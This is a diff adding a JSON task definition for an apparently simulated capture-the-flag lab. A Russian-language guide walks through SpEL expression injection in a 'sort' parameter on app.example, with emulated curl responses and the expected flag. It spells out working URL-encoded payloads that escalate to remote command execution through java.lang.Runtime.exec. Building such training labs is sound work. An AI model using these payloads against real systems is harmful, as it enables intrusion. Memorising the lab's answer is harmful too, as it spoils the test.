@@ -1,0 +1,52 @@
+{
+  "id": "web-el-ognl-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{sp3l_3xpr3ss10n_1nj3ct10n_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SpEL-инъекция на app.example\n\nПараметр `sort` в `http://app.example/api/items?sort=` подставляется в выражение SpEL.\n\n1. Норма: `curl -s 'http://app.example/api/items?sort=price'`.\n2. Арифметика: `curl -s 'http://app.example/api/items?sort=%23%7B7*7%7D'` → `\"sortedBy\":\"49\"`.\n3. Классы: `... sort=%23%7BT(java.lang.Math).random()%7D`.\n4. RCE: `... sort=%23%7BT(java.lang.Runtime).getRuntime().exec(new%20String[]%7B%22id%22%7D)%7D`.\n5. Флаг: то же с `\"cat /flag\"`.\n6. `... | grep 'nto' > found.txt`, затем `check`.\nНапоминание: `#` в URL кодируется как `%23`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example/api/items)",
+      "cases": [
+        {
+          "match": "getRuntime.*flag|exec.*flag|/flag",
+          "example": "-s '... sort=%23%7BT(java.lang.Runtime).getRuntime().exec(new%20String[]%7B%22cat%20/flag%22%7D)%7D'",
+          "output": "{\"sortedBy\": \"nto{sp3l_3xpr3ss10n_1nj3ct10n_rce}\", \"items\": [{\"id\": 1, \"price\": 100}, {\"id\": 2, \"price\": 250}]}"
+        },
+        {
+          "match": "getRuntime",
+          "example": "-s '... sort=%23%7BT(java.lang.Runtime).getRuntime().exec(new%20String[]%7B%22id%22%7D)%7D'",
+          "output": "{\"sortedBy\": \"uid=0(root) gid=0(root) groups=0(root)\", \"items\": [{\"id\": 1, \"price\": 100}, {\"id\": 2, \"price\": 250}]}"
+        },
+        {
+          "match": "Math.*random|random",
+          "example": "-s '... sort=%23%7BT(java.lang.Math).random()%7D'",
+          "output": "{\"sortedBy\": \"0.7281374\", \"items\": [{\"id\": 1, \"price\": 100}, {\"id\": 2, \"price\": 250}]}"
+        },
+        {
+          "match": "7\\*7",
+          "example": "-s '... sort=%23%7B7*7%7D'",
+          "output": "{\"sortedBy\": \"49\", \"items\": [{\"id\": 1, \"price\": 100}, {\"id\": 2, \"price\": 250}]}"
+        },
+        {
+          "match": "sort=price",
+          "example": "-s 'http://app.example/api/items?sort=price'",
+          "output": "{\"sortedBy\": \"price\", \"items\": [{\"id\": 1, \"price\": 100}, {\"id\": 2, \"price\": 250}]}"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://app.example/api/items.\n"
+    }
+  }
+}
